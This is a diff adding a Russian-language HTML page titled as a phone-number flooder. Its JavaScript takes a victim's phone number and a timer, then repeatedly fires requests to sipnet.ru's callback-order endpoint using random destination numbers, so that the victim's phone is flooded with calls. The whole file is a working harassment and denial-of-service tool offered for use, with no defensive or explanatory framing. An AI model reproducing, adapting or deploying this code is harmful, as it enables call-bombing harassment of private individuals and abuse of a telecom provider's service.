@@ -1,0 +1,392 @@
+<html>
+
+<title>Номер для флуда</title>
+
+
+<input style="display:none" id="tel2" type="text" size="15" placeholder="">
+
+
+
+<BR>
+<BR>
+<BR>
+<BR>
+<BR>
+<BR>
+
+
+<center>
+
+
+
+
+<table border="1" bordercolor="Black" width="300" bgcolor="white" cellspacing="0" cellpadding="5">
+<tr>
+<td>
+
+
+<center>
+
+
+<BR>
+
+<B>FLOODER PHONE NUMBERS</B>
+
+
+<BR>
+<BR>
+
+
+<B>call every</B> <input id="tel3" type="text" style="text-align:center" size="3" placeholder=""> <B>seconds</B> &nbsp;&nbsp;
+
+
+<BR>
+<BR>
+
+<B>phone number</B>
+<BR>
+
+
+<input id="tel1" type="text" style="text-align:center" size="15" placeholder="79031234567"> 
+
+
+<BR>
+<BR>
+
+
+
+
+<input type="button" id="btn4" onclick="pro3();" value="start calling"> 
+
+
+
+
+
+<BR>
+<BR>
+
+<font size="4" id="text4">0</font>
+
+
+
+<BR>
+<BR>
+
+
+
+
+</center>
+
+
+
+
+</td>
+</tr>
+</table>
+
+
+
+
+
+
+</center>
+
+
+
+
+
+
+</html>
+
+
+
+
+<script type="text/javascript" src="jquery-latest.js"></script>
+<script type="text/javascript">
+
+
+tel1.value = "";
+tel2.value = "";
+tel3.value = 60;
+$('#tel3').removeAttr('disabled');
+$('#tel1').removeAttr('disabled');
+$('#btn4').removeAttr('disabled');
+n = 0;
+z = 0;
+s = 0;
+
+
+
+
+function pro5()
+
+{
+
+
+
+if (z == 5)
+{
+
+z = 0;
+
+}
+
+
+
+
+z = z + 1;
+
+
+
+
+
+
+if (z == 1)
+{
+
+s = 913;
+
+}
+
+
+if (z == 2)
+{
+
+s = 903;
+
+}
+
+
+
+if (z == 3)
+{
+
+s = 908;
+
+}
+
+
+
+if (z == 4)
+{
+
+s = 961;
+
+}
+
+
+
+if (z == 5)
+{
+
+s = 950;
+
+}
+
+
+
+
+
+
+tel2.value = Math.random();
+
+tel2.value = "7" + s + tel2.value.substr(-7);
+
+
+
+
+}
+
+
+
+
+
+
+function pro3()
+
+{
+
+
+
+
+
+
+
+
+if (tel1.value == "")
+{
+alert('Введите номер телефона. Пример: 79031234567')
+return;
+}
+
+
+
+
+pr = tel1.value * 1;
+
+if (tel1.value != pr)
+{
+alert('Введен неверный номер телефона. Пример: 79031234567')
+tel1.value = "";
+return;
+}
+
+
+
+if (tel1.value.substr(0,1) == "+")
+{
+alert('Введен неверный номер телефона. Пример: 79031234567')
+tel1.value = "";
+return;
+}
+
+
+if (tel1.value.length > 20)
+{
+alert('Введен неверный номер телефона. Пример: 79031234567')
+tel1.value = "";
+return;
+}
+
+
+if (tel1.value.length < 11)
+{
+alert('Введен неверный номер телефона. Пример: 79031234567')
+tel1.value = "";
+return;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+if (tel3.value == "")
+{
+alert('Установите таймер. Минимум на 20 секунд.')
+tel3.value = 20;
+return;
+}
+
+
+
+
+pr = tel3.value * 1;
+
+if (tel3.value != pr)
+{
+alert('Неправильно установлен таймер.')
+tel3.value = "";
+return;
+}
+
+
+
+
+if (tel3.value < 1)
+{
+alert('Установите таймер. Минимум на 20 секунд.')
+tel3.value = 20;
+return;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+$('#tel3').attr('disabled', 'disabled');
+
+$('#tel1').attr('disabled', 'disabled');
+
+$('#btn4').attr('disabled', 'disabled');
+
+
+
+pro7()
+
+
+
+timer = setInterval(pro7,+tel3.value+'000');
+
+
+}
+
+
+
+
+
+
+function pro7()
+
+{
+
+
+
+
+pro5()
+
+n = n + 1;
+
+$('#text4').text(n);
+
+
+
+
+
+
+
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://www.sipnet.ru/cabinet/do_zakaz_service?PHONESRC='+tel1.value+'&PHONEDST='+tel2.value, true);
+xhr.withCredentials = true;
+xhr.setRequestHeader('Cookie', "key=value");
+xhr.send(null);
+
+
+
+
+
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</script>
+
+
+
+
+
+
+
+
